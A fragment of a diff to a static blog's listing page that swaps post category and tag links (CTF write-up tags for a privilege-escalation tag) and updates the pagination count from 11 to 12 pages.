-          </div>
-        
-        
-          <div class="post-meta mr-3 d-flex align-items-center">
-            <i class="iconfont icon-category"></i>
-            
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-          </div>
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/wp/">#wp</a>
-            
-              <a href="/tags/ciscn/">#ciscn</a>
-            
-              <a href="/tags/2024%E7%AB%9E%E8%B5%9B/">#2024竞赛</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>
             
           </div>
         
@@ -980,7 +980,7 @@
 
   <nav aria-label="navigation">
     <span class="pagination" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#board">3</a><a class="page-number" href="/page/4/#board">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/#board">11</a><a class="extend next" rel="next" href="/page/3/#board"><i class="iconfont icon-arrowright"></i></a>
+      <a class="extend prev" rel="prev" href="/"><i class="iconfont icon-arrowleft"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#board">3</a><a class="page-number" href="/page/4/#board">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/#board">12</a><a class="extend next" rel="next" href="/page/3/#board"><i class="iconfont icon-arrowright"></i></a>
     </span>
   </nav>
 
